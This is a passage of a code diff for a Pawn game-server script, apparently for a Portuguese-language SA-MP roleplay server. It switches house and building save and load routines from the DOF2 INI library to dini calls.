-	DOF2_SetFloat(ficheiro, "ExitAngle", buInfo[i][ExitAngle]);
-	DOF2_SetInt(ficheiro, "Interior", buInfo[i][Interior]);
-	DOF2_SetInt(ficheiro, "VirtualWorld", i);
-	DOF2_SetInt(ficheiro, "PickupID", buInfo[i][PickupID]);
-	DOF2_SetInt(ficheiro, "Locked", buInfo[i][Locked]);
-
-	DOF2_SaveFile();
+	dini_IntSet(ficheiro, "ID", i);
+	dini_Set(ficheiro, "Nome", buInfo[i][Nome]);
+	dini_FloatSet(ficheiro, "EnterX", buInfo[i][EnterX]);
+	dini_FloatSet(ficheiro, "EnterY", buInfo[i][EnterY]);
+	dini_FloatSet(ficheiro, "EnterZ", buInfo[i][EnterZ]);
+	dini_FloatSet(ficheiro, "EnterAngle", buInfo[i][EnterAngle]);
+	dini_IntSet(ficheiro, "EnterInterior", buInfo[i][EnterInterior]);
+	dini_IntSet(ficheiro, "EnterVirtualWorld", buInfo[i][EnterVirtualWorld]);
+	dini_FloatSet(ficheiro, "ExitX", buInfo[i][ExitX]);
+	dini_FloatSet(ficheiro, "ExitY", buInfo[i][ExitY]);
+	dini_FloatSet(ficheiro, "ExitZ", buInfo[i][ExitZ]);
+	dini_FloatSet(ficheiro, "ExitAngle", buInfo[i][ExitAngle]);
+	dini_IntSet(ficheiro, "Interior", buInfo[i][Interior]);
+	dini_IntSet(ficheiro, "VirtualWorld", i);
+	dini_IntSet(ficheiro, "PickupID", buInfo[i][PickupID]);
+	dini_IntSet(ficheiro, "Locked", buInfo[i][Locked]);
 
 	AtualizarBuilding(id);
 
@@ -11726,7 +11737,7 @@ public AtualizarBuilding(id)
 
 	BuildingPickup[id] = CreateDynamicPickup(buInfo[id][PickupID], 1, buInfo[id][EnterX], buInfo[id][EnterY], buInfo[id][EnterZ]+0.6, -1, -1, -1, 100.0);
 	BuildingLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, buInfo[id][EnterX], buInfo[id][EnterY], buInfo[id][EnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-	
+
 	return 1;
 }
 
@@ -11743,105 +11754,103 @@ public CarregarCasas()
 	    if(i == 0) continue;
 
     	format(ficheiro, sizeof(ficheiro), "PCRP/Casas/%d.ini", i);
-    	if(!DOF2_FileExists(ficheiro))
+    	if(!dini_Exists(ficheiro))
   		{
-	  		DOF2_CreateFile(ficheiro);
+	  		dini_Create(ficheiro);
 
-            DOF2_SetInt(ficheiro, "ID", i);
-            DOF2_SetString(ficheiro, "Nome", "Unused");
-            DOF2_SetString(ficheiro, "Owner", "Ninguém");
-            DOF2_SetFloat(ficheiro, "Comprada", 0);
-  			DOF2_SetFloat(ficheiro, "EnterX", 0);
-  			DOF2_SetFloat(ficheiro, "EnterY", 0);
-  			DOF2_SetFloat(ficheiro, "EnterZ", 0);
-  			DOF2_SetFloat(ficheiro, "EnterAngle", 0);
-  			DOF2_SetInt(ficheiro, "EnterInterior", 0);
-  			DOF2_SetInt(ficheiro, "EnterVirtualWorld", 0);
-            DOF2_SetFloat(ficheiro, "ExitX", 0);
-            DOF2_SetFloat(ficheiro, "ExitY", 0);
-            DOF2_SetFloat(ficheiro, "ExitZ", 0);
-            DOF2_SetFloat(ficheiro, "ExitAngle", 0);
-  			DOF2_SetInt(ficheiro, "Interior", 0);
-  			DOF2_SetInt(ficheiro, "VirtualWorld", i);
-            DOF2_SetInt(ficheiro, "PickupID", 1273);
-            DOF2_SetInt(ficheiro, "Locked", 1);
-            DOF2_SetInt(ficheiro, "Price", 0);
-            DOF2_SetInt(ficheiro, "Bank", 0);
-            DOF2_SetInt(ficheiro, "AluguerStatus", 0);
-            DOF2_SetInt(ficheiro, "Aluguer", 0);
-            DOF2_SetInt(ficheiro, "Arma1", 0);
-            DOF2_SetInt(ficheiro, "Ammo1", 0);
-            DOF2_SetInt(ficheiro, "Arma2", 0);
-            DOF2_SetInt(ficheiro, "Ammo2", 0);
-            DOF2_SetInt(ficheiro, "Arma3", 0);
-            DOF2_SetInt(ficheiro, "Ammo3", 0);
-            DOF2_SetInt(ficheiro, "IsCaravana", 0);
-            DOF2_SetInt(ficheiro, "CarroCaravanaID", 0);
-  			DOF2_SetFloat(ficheiro, "GaragemEnterX", 0);
-  			DOF2_SetFloat(ficheiro, "GaragemEnterY", 0);
-  			DOF2_SetFloat(ficheiro, "GaragemEnterZ", 0);
-  			DOF2_SetInt(ficheiro, "GaragemEnterInterior", 0);
-  			DOF2_SetInt(ficheiro, "GaragemEnterVirtualWorld", 0);
-            DOF2_SetFloat(ficheiro, "GaragemExitX", 0);
-            DOF2_SetFloat(ficheiro, "GaragemExitY", 0);
-            DOF2_SetFloat(ficheiro, "GaragemExitZ", 0);
-            DOF2_SetFloat(ficheiro, "GaragemExitAngle", 0);
-  			DOF2_SetInt(ficheiro, "GaragemVirtualWorld", 0);
-  			DOF2_SetInt(ficheiro, "GaragemPickupID", 2485);
-            DOF2_SetInt(ficheiro, "GaragemLocked", 1);
-
-    		DOF2_SaveFile();
+            dini_IntSet(ficheiro, "ID", i);
+            dini_Set(ficheiro, "Nome", "Unused");
+            dini_Set(ficheiro, "Owner", "Ninguém");
+            dini_FloatSet(ficheiro, "Comprada", 0);
+  			dini_FloatSet(ficheiro, "EnterX", 0);
+  			dini_FloatSet(ficheiro, "EnterY", 0);
+  			dini_FloatSet(ficheiro, "EnterZ", 0);
+  			dini_FloatSet(ficheiro, "EnterAngle", 0);
+  			dini_IntSet(ficheiro, "EnterInterior", 0);
+  			dini_IntSet(ficheiro, "EnterVirtualWorld", 0);
+            dini_FloatSet(ficheiro, "ExitX", 0);
+            dini_FloatSet(ficheiro, "ExitY", 0);
+            dini_FloatSet(ficheiro, "ExitZ", 0);
+            dini_FloatSet(ficheiro, "ExitAngle", 0);
+  			dini_IntSet(ficheiro, "Interior", 0);
+  			dini_IntSet(ficheiro, "VirtualWorld", i);
+            dini_IntSet(ficheiro, "PickupID", 1273);
+            dini_IntSet(ficheiro, "Locked", 1);
+            dini_IntSet(ficheiro, "Price", 0);
+            dini_IntSet(ficheiro, "Bank", 0);
+            dini_IntSet(ficheiro, "AluguerStatus", 0);
+            dini_IntSet(ficheiro, "Aluguer", 0);
+            dini_IntSet(ficheiro, "Arma1", 0);
+            dini_IntSet(ficheiro, "Ammo1", 0);
+            dini_IntSet(ficheiro, "Arma2", 0);
+            dini_IntSet(ficheiro, "Ammo2", 0);
+            dini_IntSet(ficheiro, "Arma3", 0);
+            dini_IntSet(ficheiro, "Ammo3", 0);
+            dini_IntSet(ficheiro, "IsCaravana", 0);
+            dini_IntSet(ficheiro, "CarroCaravanaID", 0);
+  			dini_FloatSet(ficheiro, "GaragemEnterX", 0);
+  			dini_FloatSet(ficheiro, "GaragemEnterY", 0);
+  			dini_FloatSet(ficheiro, "GaragemEnterZ", 0);
+  			dini_IntSet(ficheiro, "GaragemEnterInterior", 0);
+  			dini_IntSet(ficheiro, "GaragemEnterVirtualWorld", 0);
+            dini_FloatSet(ficheiro, "GaragemExitX", 0);
+            dini_FloatSet(ficheiro, "GaragemExitY", 0);
+            dini_FloatSet(ficheiro, "GaragemExitZ", 0);
+            dini_FloatSet(ficheiro, "GaragemExitAngle", 0);
+  			dini_IntSet(ficheiro, "GaragemVirtualWorld", 0);
+  			dini_IntSet(ficheiro, "GaragemPickupID", 2485);
+            dini_IntSet(ficheiro, "GaragemLocked", 1);
    		}
    		else
    		{
-   		    hInfo[i][ID] = DOF2_GetInt(ficheiro, "ID");
-   		    format(hInfo[i][Nome], 32, "%s", DOF2_GetString(ficheiro, "Nome"));
-   		    format(hInfo[i][Owner], 32, "%s", DOF2_GetString(ficheiro, "Owner"));
-   		    hInfo[i][Comprada] = DOF2_GetInt(ficheiro, "Comprada");
-   		    hInfo[i][EnterX] = DOF2_GetFloat(ficheiro, "EnterX");
-   		    hInfo[i][EnterY] = DOF2_GetFloat(ficheiro, "EnterY");
-   		    hInfo[i][EnterZ] = DOF2_GetFloat(ficheiro, "EnterZ");
-   		    hInfo[i][EnterAngle] = DOF2_GetFloat(ficheiro, "EnterAngle");
-   		    hInfo[i][EnterInterior] = DOF2_GetInt(ficheiro, "EnterInterior");
-   		    hInfo[i][EnterVirtualWorld] = DOF2_GetInt(ficheiro, "EnterVirtualWorld");
-   		    hInfo[i][ExitX] = DOF2_GetFloat(ficheiro, "ExitX");
-   		    hInfo[i][ExitY] = DOF2_GetFloat(ficheiro, "ExitY");
-   		    hInfo[i][ExitZ] = DOF2_GetFloat(ficheiro, "ExitZ");
-   		    hInfo[i][ExitAngle] = DOF2_GetFloat(ficheiro, "ExitAngle");
-   		    hInfo[i][Interior] = DOF2_GetInt(ficheiro, "Interior");
-   		    hInfo[i][VirtualWorld] = DOF2_GetInt(ficheiro, "VirtualWorld");
-   		    hInfo[i][PickupID] = DOF2_GetInt(ficheiro, "PickupID");
-   		    hInfo[i][Locked] = DOF2_GetInt(ficheiro, "Locked");
-   		    hInfo[i][Price] = DOF2_GetInt(ficheiro, "Price");
-   		    hInfo[i][Bank] = DOF2_GetInt(ficheiro, "Bank");
-   		    hInfo[i][AluguerStatus] = DOF2_GetInt(ficheiro, "AluguerStatus");
-   		    hInfo[i][Aluguer] = DOF2_GetInt(ficheiro, "Aluguer");
-   		    hInfo[i][Arma1] = DOF2_GetInt(ficheiro, "Arma1");
-   		    hInfo[i][Ammo1] = DOF2_GetInt(ficheiro, "Ammo1");
-   		    hInfo[i][Arma2] = DOF2_GetInt(ficheiro, "Arma2");
-   		    hInfo[i][Ammo2] = DOF2_GetInt(ficheiro, "Ammo2");
-   		    hInfo[i][Arma3] = DOF2_GetInt(ficheiro, "Arma3");
-   		    hInfo[i][Ammo3] = DOF2_GetInt(ficheiro, "Ammo3");
-   		    hInfo[i][IsCaravana] = DOF2_GetInt(ficheiro, "IsCaravana");
-   		    hInfo[i][CarroCaravanaID] = DOF2_GetInt(ficheiro, "CarroCaravanaID");
-   		    hInfo[i][GaragemEnterX] = DOF2_GetFloat(ficheiro, "GaragemEnterX");
-   		    hInfo[i][GaragemEnterY] = DOF2_GetFloat(ficheiro, "GaragemEnterY");
-   		    hInfo[i][GaragemEnterZ] = DOF2_GetFloat(ficheiro, "GaragemEnterZ");
-   		    hInfo[i][GaragemEnterInterior] = DOF2_GetInt(ficheiro, "GaragemEnterInterior");
-   		    hInfo[i][GaragemEnterVirtualWorld] = DOF2_GetInt(ficheiro, "GaragemEnterVirtualWorld");
-   		    hInfo[i][GaragemExitX] = DOF2_GetFloat(ficheiro, "GaragemExitX");
-   		    hInfo[i][GaragemExitY] = DOF2_GetFloat(ficheiro, "GaragemExitY");
-   		    hInfo[i][GaragemExitZ] = DOF2_GetFloat(ficheiro, "GaragemExitZ");
-   		    hInfo[i][GaragemEnterVirtualWorld] = DOF2_GetInt(ficheiro, "GaragemEnterVirtualWorld");
-   		    hInfo[i][GaragemPickupID] = DOF2_GetInt(ficheiro, "GaragemPickupID");
-   		    hInfo[i][GaragemLocked] = DOF2_GetInt(ficheiro, "GaragemLocked");
+   		    hInfo[i][ID] = dini_Int(ficheiro, "ID");
+   		    format(hInfo[i][Nome], 32, "%s", dini_Get(ficheiro, "Nome"));
+   		    format(hInfo[i][Owner], 32, "%s", dini_Get(ficheiro, "Owner"));
+   		    hInfo[i][Comprada] = dini_Int(ficheiro, "Comprada");
+   		    hInfo[i][EnterX] = dini_Float(ficheiro, "EnterX");
+   		    hInfo[i][EnterY] = dini_Float(ficheiro, "EnterY");
+   		    hInfo[i][EnterZ] = dini_Float(ficheiro, "EnterZ");
+   		    hInfo[i][EnterAngle] = dini_Float(ficheiro, "EnterAngle");
+   		    hInfo[i][EnterInterior] = dini_Int(ficheiro, "EnterInterior");
+   		    hInfo[i][EnterVirtualWorld] = dini_Int(ficheiro, "EnterVirtualWorld");
+   		    hInfo[i][ExitX] = dini_Float(ficheiro, "ExitX");
+   		    hInfo[i][ExitY] = dini_Float(ficheiro, "ExitY");
+   		    hInfo[i][ExitZ] = dini_Float(ficheiro, "ExitZ");
+   		    hInfo[i][ExitAngle] = dini_Float(ficheiro, "ExitAngle");
+   		    hInfo[i][Interior] = dini_Int(ficheiro, "Interior");
+   		    hInfo[i][VirtualWorld] = dini_Int(ficheiro, "VirtualWorld");
+   		    hInfo[i][PickupID] = dini_Int(ficheiro, "PickupID");
+   		    hInfo[i][Locked] = dini_Int(ficheiro, "Locked");
+   		    hInfo[i][Price] = dini_Int(ficheiro, "Price");
+   		    hInfo[i][Bank] = dini_Int(ficheiro, "Bank");
+   		    hInfo[i][AluguerStatus] = dini_Int(ficheiro, "AluguerStatus");
+   		    hInfo[i][Aluguer] = dini_Int(ficheiro, "Aluguer");
+   		    hInfo[i][Arma1] = dini_Int(ficheiro, "Arma1");
+   		    hInfo[i][Ammo1] = dini_Int(ficheiro, "Ammo1");
+   		    hInfo[i][Arma2] = dini_Int(ficheiro, "Arma2");
+   		    hInfo[i][Ammo2] = dini_Int(ficheiro, "Ammo2");
+   		    hInfo[i][Arma3] = dini_Int(ficheiro, "Arma3");
+   		    hInfo[i][Ammo3] = dini_Int(ficheiro, "Ammo3");
+   		    hInfo[i][IsCaravana] = dini_Int(ficheiro, "IsCaravana");
+   		    hInfo[i][CarroCaravanaID] = dini_Int(ficheiro, "CarroCaravanaID");
+   		    hInfo[i][GaragemEnterX] = dini_Float(ficheiro, "GaragemEnterX");
+   		    hInfo[i][GaragemEnterY] = dini_Float(ficheiro, "GaragemEnterY");
+   		    hInfo[i][GaragemEnterZ] = dini_Float(ficheiro, "GaragemEnterZ");
+   		    hInfo[i][GaragemEnterInterior] = dini_Int(ficheiro, "GaragemEnterInterior");
+   		    hInfo[i][GaragemEnterVirtualWorld] = dini_Int(ficheiro, "GaragemEnterVirtualWorld");
+   		    hInfo[i][GaragemExitX] = dini_Float(ficheiro, "GaragemExitX");
+   		    hInfo[i][GaragemExitY] = dini_Float(ficheiro, "GaragemExitY");
+   		    hInfo[i][GaragemExitZ] = dini_Float(ficheiro, "GaragemExitZ");
+   		    hInfo[i][GaragemEnterVirtualWorld] = dini_Int(ficheiro, "GaragemEnterVirtualWorld");
+   		    hInfo[i][GaragemPickupID] = dini_Int(ficheiro, "GaragemPickupID");
+   		    hInfo[i][GaragemLocked] = dini_Int(ficheiro, "GaragemLocked");
 		}
 		AtualizarCasa(i);
 	}
-	
+
 	tick2 = GetTickCount();
-	printf("\n [PC:RP] Casas carregadas (%d ms)", tick2-tick1);
-	
+	printf(" [PC:RP] Casas carregadas (%d ms)", tick2-tick1);
+
 	return 1;
 }
 
@@ -11853,50 +11862,48 @@ public GuardarCasas()
 	    if(i == 0) continue;
 	    format(ficheiro, sizeof(ficheiro), "PCRP/Casas/%d.ini", i);
 
-		DOF2_SetInt(ficheiro, "ID", i);
-		DOF2_SetString(ficheiro, "Nome", hInfo[i][Nome]);
-		DOF2_SetString(ficheiro, "Owner", hInfo[i][Owner]);
-		DOF2_SetFloat(ficheiro, "Comprada", hInfo[i][Comprada]);
-		DOF2_SetFloat(ficheiro, "EnterX", hInfo[i][EnterX]);
-		DOF2_SetFloat(ficheiro, "EnterY", hInfo[i][EnterY]);
-		DOF2_SetFloat(ficheiro, "EnterZ", hInfo[i][EnterZ]);
-		DOF2_SetFloat(ficheiro, "EnterAngle", hInfo[i][EnterAngle]);
-		DOF2_SetInt(ficheiro, "EnterInterior", hInfo[i][EnterInterior]);
-		DOF2_SetInt(ficheiro, "EnterVirtualWorld", hInfo[i][EnterVirtualWorld]);
-		DOF2_SetFloat(ficheiro, "ExitX", hInfo[i][ExitX]);
-		DOF2_SetFloat(ficheiro, "ExitY", hInfo[i][ExitY]);
-		DOF2_SetFloat(ficheiro, "ExitZ", hInfo[i][ExitZ]);
-		DOF2_SetFloat(ficheiro, "ExitAngle", hInfo[i][ExitAngle]);
-		DOF2_SetInt(ficheiro, "Interior", hInfo[i][Interior]);
-		DOF2_SetInt(ficheiro, "VirtualWorld", i);
-		DOF2_SetInt(ficheiro, "PickupID", hInfo[i][PickupID]);
-		DOF2_SetInt(ficheiro, "Locked", hInfo[i][Locked]);
-		DOF2_SetInt(ficheiro, "Price", hInfo[i][Price]);
-		DOF2_SetInt(ficheiro, "Bank", hInfo[i][Bank]);
-		DOF2_SetInt(ficheiro, "AluguerStatus", hInfo[i][AluguerStatus]);
-		DOF2_SetInt(ficheiro, "Aluguer", hInfo[i][Aluguer]);
-		DOF2_SetInt(ficheiro, "Arma1", hInfo[i][Arma1]);
-		DOF2_SetInt(ficheiro, "Ammo1", hInfo[i][Ammo1]);
-		DOF2_SetInt(ficheiro, "Arma2", hInfo[i][Arma2]);
-		DOF2_SetInt(ficheiro, "Ammo2", hInfo[i][Ammo2]);
-		DOF2_SetInt(ficheiro, "Arma3", hInfo[i][Arma3]);
-		DOF2_SetInt(ficheiro, "Ammo3", hInfo[i][Ammo3]);
-		DOF2_SetInt(ficheiro, "IsCaravana", hInfo[i][IsCaravana]);
-		DOF2_SetInt(ficheiro, "CarroCaravanaID", hInfo[i][CarroCaravanaID]);
-		DOF2_SetFloat(ficheiro, "GaragemEnterX", hInfo[i][GaragemEnterX]);
-		DOF2_SetFloat(ficheiro, "GaragemEnterY", hInfo[i][GaragemEnterY]);
-		DOF2_SetFloat(ficheiro, "GaragemEnterZ", hInfo[i][GaragemEnterZ]);
-		DOF2_SetInt(ficheiro, "GaragemEnterInterior", hInfo[i][GaragemEnterInterior]);
-		DOF2_SetInt(ficheiro, "GaragemEnterVirtualWorld", hInfo[i][GaragemEnterVirtualWorld]);
-  		DOF2_SetFloat(ficheiro, "GaragemExitX", hInfo[i][GaragemExitX]);
-  		DOF2_SetFloat(ficheiro, "GaragemExitY", hInfo[i][GaragemExitY]);
-	 	DOF2_SetFloat(ficheiro, "GaragemExitZ", hInfo[i][GaragemExitZ]);
-  		DOF2_SetFloat(ficheiro, "GaragemExitAngle", hInfo[i][GaragemExitAngle]);
-		DOF2_SetInt(ficheiro, "GaragemVirtualWorld", hInfo[i][GaragemVirtualWorld]);
-		DOF2_SetInt(ficheiro, "GaragemPickupID", hInfo[i][GaragemPickupID]);
-  		DOF2_SetInt(ficheiro, "GaragemLocked", hInfo[i][GaragemLocked]);
-
-		DOF2_SaveFile();
+		dini_IntSet(ficheiro, "ID", i);
+		dini_Set(ficheiro, "Nome", hInfo[i][Nome]);
+		dini_Set(ficheiro, "Owner", hInfo[i][Owner]);
+		dini_FloatSet(ficheiro, "Comprada", hInfo[i][Comprada]);
+		dini_FloatSet(ficheiro, "EnterX", hInfo[i][EnterX]);
+		dini_FloatSet(ficheiro, "EnterY", hInfo[i][EnterY]);
+		dini_FloatSet(ficheiro, "EnterZ", hInfo[i][EnterZ]);
+		dini_FloatSet(ficheiro, "EnterAngle", hInfo[i][EnterAngle]);
+		dini_IntSet(ficheiro, "EnterInterior", hInfo[i][EnterInterior]);
+		dini_IntSet(ficheiro, "EnterVirtualWorld", hInfo[i][EnterVirtualWorld]);
+		dini_FloatSet(ficheiro, "ExitX", hInfo[i][ExitX]);
+		dini_FloatSet(ficheiro, "ExitY", hInfo[i][ExitY]);
+		dini_FloatSet(ficheiro, "ExitZ", hInfo[i][ExitZ]);
+		dini_FloatSet(ficheiro, "ExitAngle", hInfo[i][ExitAngle]);
+		dini_IntSet(ficheiro, "Interior", hInfo[i][Interior]);
+		dini_IntSet(ficheiro, "VirtualWorld", i);
+		dini_IntSet(ficheiro, "PickupID", hInfo[i][PickupID]);
+		dini_IntSet(ficheiro, "Locked", hInfo[i][Locked]);
+		dini_IntSet(ficheiro, "Price", hInfo[i][Price]);
+		dini_IntSet(ficheiro, "Bank", hInfo[i][Bank]);
+		dini_IntSet(ficheiro, "AluguerStatus", hInfo[i][AluguerStatus]);
+		dini_IntSet(ficheiro, "Aluguer", hInfo[i][Aluguer]);
+		dini_IntSet(ficheiro, "Arma1", hInfo[i][Arma1]);
+		dini_IntSet(ficheiro, "Ammo1", hInfo[i][Ammo1]);
+		dini_IntSet(ficheiro, "Arma2", hInfo[i][Arma2]);
+		dini_IntSet(ficheiro, "Ammo2", hInfo[i][Ammo2]);
+		dini_IntSet(ficheiro, "Arma3", hInfo[i][Arma3]);
+		dini_IntSet(ficheiro, "Ammo3", hInfo[i][Ammo3]);
+		dini_IntSet(ficheiro, "IsCaravana", hInfo[i][IsCaravana]);
+		dini_IntSet(ficheiro, "CarroCaravanaID", hInfo[i][CarroCaravanaID]);
+		dini_FloatSet(ficheiro, "GaragemEnterX", hInfo[i][GaragemEnterX]);
+		dini_FloatSet(ficheiro, "GaragemEnterY", hInfo[i][GaragemEnterY]);
+		dini_FloatSet(ficheiro, "GaragemEnterZ", hInfo[i][GaragemEnterZ]);
+		dini_IntSet(ficheiro, "GaragemEnterInterior", hInfo[i][GaragemEnterInterior]);
+		dini_IntSet(ficheiro, "GaragemEnterVirtualWorld", hInfo[i][GaragemEnterVirtualWorld]);
+  		dini_FloatSet(ficheiro, "GaragemExitX", hInfo[i][GaragemExitX]);
+  		dini_FloatSet(ficheiro, "GaragemExitY", hInfo[i][GaragemExitY]);
+	 	dini_FloatSet(ficheiro, "GaragemExitZ", hInfo[i][GaragemExitZ]);
+  		dini_FloatSet(ficheiro, "GaragemExitAngle", hInfo[i][GaragemExitAngle]);
+		dini_IntSet(ficheiro, "GaragemVirtualWorld", hInfo[i][GaragemVirtualWorld]);
+		dini_IntSet(ficheiro, "GaragemPickupID", hInfo[i][GaragemPickupID]);
+  		dini_IntSet(ficheiro, "GaragemLocked", hInfo[i][GaragemLocked]);
 
 	}
 	return 1;
@@ -11909,50 +11916,48 @@ public GuardarCasa(id)
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Casas/%d.ini", i);
 
-	DOF2_SetInt(ficheiro, "ID", i);
-	DOF2_SetString(ficheiro, "Nome", hInfo[i][Nome]);
-	DOF2_SetString(ficheiro, "Owner", hInfo[i][Owner]);
-	DOF2_SetFloat(ficheiro, "Comprada", hInfo[i][Comprada]);
-	DOF2_SetFloat(ficheiro, "EnterX", hInfo[i][EnterX]);
-	DOF2_SetFloat(ficheiro, "EnterY", hInfo[i][EnterY]);
-	DOF2_SetFloat(ficheiro, "EnterZ", hInfo[i][EnterZ]);
-	DOF2_SetFloat(ficheiro, "EnterAngle", hInfo[i][EnterAngle]);
-	DOF2_SetInt(ficheiro, "EnterInterior", hInfo[i][EnterInterior]);
-	DOF2_SetInt(ficheiro, "EnterVirtualWorld", hInfo[i][EnterVirtualWorld]);
-	DOF2_SetFloat(ficheiro, "ExitX", hInfo[i][ExitX]);
-	DOF2_SetFloat(ficheiro, "ExitY", hInfo[i][ExitY]);
-	DOF2_SetFloat(ficheiro, "ExitZ", hInfo[i][ExitZ]);
-	DOF2_SetFloat(ficheiro, "ExitAngle", hInfo[i][ExitAngle]);
-	DOF2_SetInt(ficheiro, "Interior", hInfo[i][Interior]);
-	DOF2_SetInt(ficheiro, "VirtualWorld", i);
-	DOF2_SetInt(ficheiro, "PickupID", hInfo[i][PickupID]);
-	DOF2_SetInt(ficheiro, "Locked", hInfo[i][Locked]);
-	DOF2_SetInt(ficheiro, "Price", hInfo[i][Price]);
-	DOF2_SetInt(ficheiro, "Bank", hInfo[i][Bank]);
-	DOF2_SetInt(ficheiro, "AluguerStatus", hInfo[i][AluguerStatus]);
-	DOF2_SetInt(ficheiro, "Aluguer", hInfo[i][Aluguer]);
-	DOF2_SetInt(ficheiro, "Arma1", hInfo[i][Arma1]);
-	DOF2_SetInt(ficheiro, "Ammo1", hInfo[i][Ammo1]);
-	DOF2_SetInt(ficheiro, "Arma2", hInfo[i][Arma2]);
-	DOF2_SetInt(ficheiro, "Ammo2", hInfo[i][Ammo2]);
-	DOF2_SetInt(ficheiro, "Arma3", hInfo[i][Arma3]);
-	DOF2_SetInt(ficheiro, "Ammo3", hInfo[i][Ammo3]);
-	DOF2_SetInt(ficheiro, "IsCaravana", hInfo[i][IsCaravana]);
-	DOF2_SetInt(ficheiro, "CarroCaravanaID", hInfo[i][CarroCaravanaID]);
-	DOF2_SetFloat(ficheiro, "GaragemEnterX", hInfo[i][GaragemEnterX]);
-	DOF2_SetFloat(ficheiro, "GaragemEnterY", hInfo[i][GaragemEnterY]);
-	DOF2_SetFloat(ficheiro, "GaragemEnterZ", hInfo[i][GaragemEnterZ]);
-	DOF2_SetInt(ficheiro, "GaragemEnterInterior", hInfo[i][GaragemEnterInterior]);
-	DOF2_SetInt(ficheiro, "GaragemEnterVirtualWorld", hInfo[i][GaragemEnterVirtualWorld]);
-	DOF2_SetFloat(ficheiro, "GaragemExitX", hInfo[i][GaragemExitX]);
-	DOF2_SetFloat(ficheiro, "GaragemExitY", hInfo[i][GaragemExitY]);
-	DOF2_SetFloat(ficheiro, "GaragemExitZ", hInfo[i][GaragemExitZ]);
-	DOF2_SetFloat(ficheiro, "GaragemExitAngle", hInfo[i][GaragemExitAngle]);
-	DOF2_SetInt(ficheiro, "GaragemVirtualWorld", hInfo[i][GaragemVirtualWorld]);
-	DOF2_SetInt(ficheiro, "GaragemPickupID", hInfo[i][GaragemPickupID]);
-	DOF2_SetInt(ficheiro, "GaragemLocked", hInfo[i][GaragemLocked]);
-
-	DOF2_SaveFile();
+	dini_IntSet(ficheiro, "ID", i);
+	dini_Set(ficheiro, "Nome", hInfo[i][Nome]);
+	dini_Set(ficheiro, "Owner", hInfo[i][Owner]);
+	dini_FloatSet(ficheiro, "Comprada", hInfo[i][Comprada]);
+	dini_FloatSet(ficheiro, "EnterX", hInfo[i][EnterX]);
+	dini_FloatSet(ficheiro, "EnterY", hInfo[i][EnterY]);
+	dini_FloatSet(ficheiro, "EnterZ", hInfo[i][EnterZ]);
+	dini_FloatSet(ficheiro, "EnterAngle", hInfo[i][EnterAngle]);
+	dini_IntSet(ficheiro, "EnterInterior", hInfo[i][EnterInterior]);
+	dini_IntSet(ficheiro, "EnterVirtualWorld", hInfo[i][EnterVirtualWorld]);
+	dini_FloatSet(ficheiro, "ExitX", hInfo[i][ExitX]);
+	dini_FloatSet(ficheiro, "ExitY", hInfo[i][ExitY]);
+	dini_FloatSet(ficheiro, "ExitZ", hInfo[i][ExitZ]);
+	dini_FloatSet(ficheiro, "ExitAngle", hInfo[i][ExitAngle]);
+	dini_IntSet(ficheiro, "Interior", hInfo[i][Interior]);
+	dini_IntSet(ficheiro, "VirtualWorld", i);
+	dini_IntSet(ficheiro, "PickupID", hInfo[i][PickupID]);
+	dini_IntSet(ficheiro, "Locked", hInfo[i][Locked]);
+	dini_IntSet(ficheiro, "Price", hInfo[i][Price]);
+	dini_IntSet(ficheiro, "Bank", hInfo[i][Bank]);
+	dini_IntSet(ficheiro, "AluguerStatus", hInfo[i][AluguerStatus]);
+	dini_IntSet(ficheiro, "Aluguer", hInfo[i][Aluguer]);
+	dini_IntSet(ficheiro, "Arma1", hInfo[i][Arma1]);
+	dini_IntSet(ficheiro, "Ammo1", hInfo[i][Ammo1]);
+	dini_IntSet(ficheiro, "Arma2", hInfo[i][Arma2]);
+	dini_IntSet(ficheiro, "Ammo2", hInfo[i][Ammo2]);
+	dini_IntSet(ficheiro, "Arma3", hInfo[i][Arma3]);
+	dini_IntSet(ficheiro, "Ammo3", hInfo[i][Ammo3]);
+	dini_IntSet(ficheiro, "IsCaravana", hInfo[i][IsCaravana]);
+	dini_IntSet(ficheiro, "CarroCaravanaID", hInfo[i][CarroCaravanaID]);
+	dini_FloatSet(ficheiro, "GaragemEnterX", hInfo[i][GaragemEnterX]);
+	dini_FloatSet(ficheiro, "GaragemEnterY", hInfo[i][GaragemEnterY]);
+	dini_FloatSet(ficheiro, "GaragemEnterZ", hInfo[i][GaragemEnterZ]);
+	dini_IntSet(ficheiro, "GaragemEnterInterior", hInfo[i][GaragemEnterInterior]);
+	dini_IntSet(ficheiro, "GaragemEnterVirtualWorld", hInfo[i][GaragemEnterVirtualWorld]);
+	dini_FloatSet(ficheiro, "GaragemExitX", hInfo[i][GaragemExitX]);
+	dini_FloatSet(ficheiro, "GaragemExitY", hInfo[i][GaragemExitY]);
+	dini_FloatSet(ficheiro, "GaragemExitZ", hInfo[i][GaragemExitZ]);
+	dini_FloatSet(ficheiro, "GaragemExitAngle", hInfo[i][GaragemExitAngle]);
+	dini_IntSet(ficheiro, "GaragemVirtualWorld", hInfo[i][GaragemVirtualWorld]);
+	dini_IntSet(ficheiro, "GaragemPickupID", hInfo[i][GaragemPickupID]);
+	dini_IntSet(ficheiro, "GaragemLocked", hInfo[i][GaragemLocked]);
 
 	return 1;
 }
@@ -11988,12 +11993,12 @@ public AtualizarCasa(id)
 
 	HousePickup[id] = CreateDynamicPickup(hInfo[id][PickupID], 1, hInfo[id][EnterX], hInfo[id][EnterY], hInfo[id][EnterZ], -1, -1, -1, 100.0);
 	HouseLabel[id] = CreateDynamic3DTextLabel(label, COLOR_WHITE, hInfo[id][EnterX], hInfo[id][EnterY], hInfo[id][EnterZ], 6, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
-	
+
 	format(label, sizeof(label), "");
-	
+
 	format(string, sizeof(string), "{00FF00}[ {FF0000}GARAGEM {00FF00}]"); strcat(label, string);
 	format(string, sizeof(string), "\n{00FF00}[ {FF0000}ID: {FFFFFF}%d {00FF00}]", id); strcat(label, string);
-	
+
 	GaragemPickup[id] = CreateDynamicPickup(hInfo[id][GaragemPickupID], 1, hInfo[id][GaragemEnterX], hInfo[id][GaragemEnterY], hInfo[id][GaragemEnterZ], -1, -1, -1, 100.0);
